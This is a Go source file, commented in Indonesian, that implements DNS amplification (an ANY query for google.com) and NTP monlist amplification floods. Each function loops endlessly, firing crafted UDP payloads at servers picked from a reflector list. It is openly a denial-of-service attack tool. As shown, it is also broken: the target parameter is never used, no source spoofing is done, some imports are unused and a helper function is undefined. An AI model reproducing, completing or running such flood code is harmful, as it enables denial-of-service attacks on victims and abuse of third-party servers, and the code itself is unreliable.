package main

import (
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"
)

// Baca list reflector dari file
func readReflectors(filename string) []string {
	lines := readLines(filename)
	return lines
}

// DNS Amplification Flood
func dnsAmpFlood(target string, reflectors []string) {
	payload := "\x00\x00" + "\x01\x00" + "\x00\x01" + "\x00\x00\x00\x00\x00\x00" +
		"\x03" + "www" + "\x06" + "google" + "\x03" + "com" + "\x00" + "\x00\xff\x00\x01"

	for {
		ref := reflectors[rand.Intn(len(reflectors))]
		addr, err := net.ResolveUDPAddr("udp", ref)
		if err != nil {
			continue
		}

		conn, err := net.DialUDP("udp", nil, addr)
		if err != nil {
			continue
		}

		conn.Write([]byte(payload))
		conn.Close()
	}
}

// NTP Amplification Flood (monlist)
func ntpAmpFlood(target string, reflectors []string) {
	payload := "\x17\x00\x03\x2a" + strings.Repeat("\x00", 4)

	for {
		ref := reflectors[rand.Intn(len(reflectors))]
		addr, err := net.ResolveUDPAddr("udp", ref)
		if err != nil {
			continue
		}

		conn, err := net.DialUDP("udp", nil, addr)
		if err != nil {
			continue
		}

		conn.Write([]byte(payload))
		conn.Close()
	}
}
